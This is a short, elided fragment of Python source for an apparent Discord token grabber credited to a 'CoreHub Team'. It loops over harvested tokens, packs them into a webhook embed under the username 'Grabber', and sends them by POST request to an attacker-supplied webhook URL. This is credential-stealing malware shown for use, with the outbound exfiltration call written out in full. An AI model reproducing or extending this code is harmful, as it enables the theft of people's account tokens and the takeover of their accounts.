        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "Made by CoreHub Team - https://github.com/CoreHub-lol"
                            },
                            'thumbnail': {
                    ...
                    "username": "Grabber",
                    "avatar_url": "https://avatars.githubusercontent.com/u/205449568?s=200&v=4"
                }

                urllib.request.urlopen(urllib.request.Request('your-webhook', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
